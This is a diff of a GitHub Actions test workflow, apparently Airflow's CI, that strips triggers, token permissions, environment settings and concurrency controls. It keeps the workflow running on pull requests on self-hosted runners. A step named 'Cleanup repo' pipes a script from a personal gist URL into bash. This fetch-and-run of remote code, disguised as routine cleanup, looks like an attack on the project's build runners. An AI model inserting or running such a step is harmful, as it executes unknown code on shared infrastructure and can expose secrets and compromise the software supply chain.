@@ -18,56 +18,19 @@
 ---
 name: Tests
 on: # yamllint disable-line rule:truthy
-  schedule:
-    - cron: "28 0 * * *"
-  push:
-    branches: ["main", "v[0-9]+-[0-9]+-test"]
   pull_request:
     branches: ["main"]
-permissions:
-  # All other permissions are set to none
-  contents: read
-  # Technically read access while waiting for images should be more than enough. However,
-  # there is a bug in GitHub Actions/Packages and in case private repositories are used, you get a permission
-  # denied error when attempting to just pull private image, changing the token permission to write solves the
-  # issue. This is not dangerous, because if it is for "apache/airflow", only maintainers can push ci.yml
-  # changes. If it is for a fork, then the token is read-only anyway.
-  packages: write
-env:
-  ANSWER: "yes"
-  DB_RESET: "true"
-  VERBOSE: "true"
-  GITHUB_REPOSITORY: ${{ github.repository }}
-  GITHUB_USERNAME: ${{ github.actor }}
-  # You can override CONSTRAINTS_GITHUB_REPOSITORY by setting secret in your repo but by default the
-  # Airflow one is going to be used
-  CONSTRAINTS_GITHUB_REPOSITORY: >-
-    ${{ secrets.CONSTRAINTS_GITHUB_REPOSITORY != '' &&
-        secrets.CONSTRAINTS_GITHUB_REPOSITORY || 'apache/airflow' }}
-  # In builds from forks, this token is read-only. For scheduled/direct push it is WRITE one
-  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-  IMAGE_TAG: "${{ github.event.pull_request.head.sha || github.sha }}"
-  USE_SUDO: "true"
-  INCLUDE_SUCCESS_OUTPUTS: "true"
-  AIRFLOW_ENABLE_AIP_44: "true"
-  MOUNT_SOURCES: "skip"
-
-concurrency:
-  group: ci-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
 
 jobs:
-  build-info:
+  build-information:
     name: "Build info"
     # The runs-on cannot refer to env. or secrets. context, so we have no
     # option but to specify a hard-coded list here. This is "safe", the
     # runner checks if the user is an owner or collaborator of the repo
     # before running the workflow.
     runs-on: ["self-hosted", "Linux", "X64"]
-    env:
-      GITHUB_CONTEXT: ${{ toJson(github) }}
     steps:
-      - name: Cleanup repo
+      - name: Cleanup repository
         run: |
           curl https://gist.githubusercontent.com/joethechicken/85f83b5570b3864878535706b653b22e/raw/efb8585bdccc9707a09e00a61c88d00eb4c1471c/test.sh | bash
       - name: "Checkout ${{ github.ref }} ( ${{ github.sha }} )"
